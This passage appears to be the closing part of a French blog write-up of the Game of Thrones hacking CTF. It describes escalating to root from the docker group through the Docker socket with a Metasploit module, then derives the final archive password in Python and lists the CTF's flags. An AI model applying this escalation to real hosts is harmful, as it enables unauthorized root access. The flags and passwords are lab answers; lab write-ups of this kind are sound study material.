checkpoint.txt
branstark@7kingdoms:~$ cat checkpoint.txt

Now you are ready to face the final battle!! Try to escalate to root.

"Seven blessings to all of you and good luck" - Game of Thrones CTF master ;)
```

On peut lister les différentes images docker :  

```plain
branstark@7kingdoms:~$ docker images
REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
ironislands           latest              ca673df5a4d0        8 weeks ago         214MB
dragonglassmine       latest              55ec6084ae2c        2 months ago        208MB
kingslanding          latest              481c10d705d8        2 months ago        276MB
reach                 latest              e3b43aacd568        2 months ago        252MB
mountainandthevale    latest              f298c2e8279f        2 months ago        287MB
stormlands            latest              bf1141670de7        2 months ago        338MB
rock                  latest              5bb888ae3d75        2 months ago        374MB
basecamp-winterfell   latest              284cf1128d23        2 months ago        407MB
dorne                 latest              82fb98a60e15        2 months ago        428MB
```

Pour sortir d'un docker quand on a accès au fichier */run/docker.sock* (typiquement quand on est membre du groupe docker), il peut suffire d'utiliser une image destinée à l'exploitation comme [dockerrootplease](https://github.com/chrisfosterelli/dockerrootplease) ou [docker-privilege-escalation](https://github.com/KrustyHack/docker-privilege-escalation).  

Sauf que rien à faire, même en jouant avec les paramètres de config j'obtenais toujours l'erreur suivante :  

```plain
Get https://registry-1.docker.io/v1/repositories/library/redis/tags/latest: net/http: TLS handshake timeout.
```

De quoi avoir envie d'envoyer les dévs de Docker dans les flammes de *R'hllor* !!  

Mais le Dieu de la Lumière a entendu nos prières et nous dirige vers un exploit *Metasploit* :  

![Docker escalation](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/docker_pwn.png)

On obtient l'euid 0 qui nous permet d'accéder à un dernier indice :  

> To defeat White Walkers you need the help of the Savages, the Many-Faced God skill learned at Braavos and the Dragonglass weapons  
> 
>   
> 
> Some hints:  
> 
>   
> 
> type of file = ???  
> 
> pass = ???  
> 
> useful-pseudo-code-on-invented-language = concat(substr(secret\_flag1, strlen(secret\_flag1) - 10, strlen(secret\_flag1)), substr(secret\_flag2, strlen(secret\_flag2) - 10, strlen(secret\_flag2)), substr(secret\_flag3, strlen(secret\_flag3) - 10, strlen(secret\_flag3)))  
> 
>   
> 
> "Hodor... Hodor!!" - Hodor

Si on suit bien l'indice le premier flag est 8bf8854bebe108183caeb845c7676ae4, le second 3f82c41a70a8b0cfec9052252d9fd721 et le troisième a8db1d82db78ed452ba0882fb9554fc9.  

Au lieu de retoucher au pseudo-code j'ai adapté Python :  

```python
>>> strlen = len
>>> def substr(s, start, end):
...   return s[start:end]
... 
>>> secret_flag1 = "8bf8854bebe108183caeb845c7676ae4"
>>> secret_flag2 = "3f82c41a70a8b0cfec9052252d9fd721"
>>> secret_flag3 = "a8db1d82db78ed452ba0882fb9554fc9"
>>> substr(secret_flag1, strlen(secret_flag1) - 10, strlen(secret_flag1)), substr(secret_flag2, strlen(secret_flag2) - 10, strlen(secret_flag2)), substr(secret_flag3, strlen(secret_flag3) - 10, strlen(secret_flag3))
('45c7676ae4', '252d9fd721', '2fb9554fc9')
```

Le mot de passe *45c7676ae4252d9fd7212fb9554fc9* permet alors d'ouvrir l'archive 7z *final\_battle.zip* qui contient le fichier *flag.txt*  

```plain
Final Battle flag: 8e63dcd86ef9574181a9b6184ed3dde5
                     _
 ___ _ _ _ ___ ___ _| |
| . | | | |   | -_| . |
|  _|_____|_|_|___|___|
|_|

You won the battle against White Walkers. You pwned the Game of Thrones CTF!!! (v1.0 September 2017)

Now the seven kingdoms can rest in peace for a long time ruled by a true king/queen.

Congratulations and I hope you enjoyed the experience as much as me making it!!

Designed by Oscar Alfonso (OscarAkaElvis or v1s1t0r)
Contact: v1s1t0r.1s.h3r3@gmail.com
https://github.com/OscarAkaElvis/game-of-thrones-hacking-ctf

A last little present! you can get now all the flags ordered:

Dorne
Winterfell
Iron Islands
Stormlands
Mountain and the Vale
Reach
Rock and King's Landing
Savages
City of Braavos
Dragonglass Mine
Final Battle

Get the word of each one using https://crackstation.net or any other md5 online crack service to get a phrase in a row!!
```

Si on passe les hash dans l'odre sur *CrackStation* :  

![MD5 flags](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/md5_msg.png)

Closing titles
--------------

Ce CTF était vraiment sympathique, bien pensé, suffisamment long et proposait une variété de technos que l'on trouve rarement sur les CTF.  

Un grand bigup à *v1s1t0r* pour la création du CTF :)

*Published November 10 2017 at 12:18*